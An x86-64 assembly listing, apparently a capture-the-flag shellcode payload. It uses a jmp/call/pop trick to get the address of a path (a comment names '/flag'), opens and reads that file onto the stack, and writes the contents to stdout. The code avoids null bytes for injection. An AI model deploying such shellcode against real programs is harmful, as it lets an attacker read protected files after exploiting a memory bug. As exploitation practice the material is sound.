.intel_syntax noprefix
.globl _start
_start:
    jmp loadstring
file_read:
    pop rdi
    xor rax,rax
    push rax
    pop rsi
    push rax
    pop rdx
    mov al,0x2
    syscall

    push rax
    pop rdi
    push rsi
    pop rax
    push rsp
    pop rsi
    mov dl,0x40
    syscall

    xchg rax,rdx
    mov dil,0x1
    mov al,0x1
    syscall

    ret
loadstring:
    call file_read
    ## .asciz "/flag"
